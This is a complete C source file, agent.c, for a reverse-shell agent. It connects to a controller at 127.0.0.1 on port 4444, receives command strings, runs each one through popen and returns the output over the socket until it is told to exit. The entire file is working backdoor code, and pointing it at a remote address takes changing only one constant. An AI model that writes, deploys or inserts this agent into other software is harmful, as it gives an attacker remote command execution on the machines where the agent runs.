// agent.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <arpa/inet.h>

#define SERVER_IP "127.0.0.1"
#define PORT 4444
#define BUF_SIZE 4096

/* Send all bytes, handling partial writes and EINTR.
 * Returns 0 on success, -1 on error. */
static int send_all(int sock, const char *buf, size_t len) {
    size_t total = 0;
    while (total < len) {
        ssize_t n = send(sock, buf + total, len - total, 0);
        if (n < 0) {
            if (errno == EINTR)
                continue;
            perror("send");
            return -1;
        }
        total += (size_t)n;
    }
    return 0;
}

int main(void) {
    int sock;
    struct sockaddr_in server;
    char buffer[BUF_SIZE];

    memset(&server, 0, sizeof(server));

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("socket");
        return EXIT_FAILURE;
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(PORT);
    if (inet_pton(AF_INET, SERVER_IP, &server.sin_addr) != 1) {
        fprintf(stderr, "inet_pton: invalid or unsupported address '%s'\n", SERVER_IP);
        close(sock);
        return EXIT_FAILURE;
    }

    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        perror("connect");
        close(sock);
        return EXIT_FAILURE;
    }

    while (1) {
        ssize_t bytes;
        FILE *fp;
        char result[BUF_SIZE];

        memset(buffer, 0, BUF_SIZE);
        bytes = recv(sock, buffer, BUF_SIZE - 1, 0);
        if (bytes < 0) {
            if (errno == EINTR)
                continue;
            perror("recv");
            break;
        }
        if (bytes == 0) {
            printf("[*] Controller closed the connection\n");
            break;
        }

        if (strncmp(buffer, "exit", 4) == 0)
            break;

        fp = popen(buffer, "r");
        if (!fp) {
            perror("popen");
            const char *err = "Command execution failed\n";
            if (send_all(sock, err, strlen(err)) < 0)
                break;
            continue;
        }

        memset(result, 0, BUF_SIZE);
        if (fread(result, 1, BUF_SIZE - 1, fp) == 0 && ferror(fp)) {
            perror("fread");
        }
        pclose(fp);

        if (send_all(sock, result, strlen(result)) < 0)
            break;
    }

    if (close(sock) < 0)
        perror("close");
    return EXIT_SUCCESS;
}
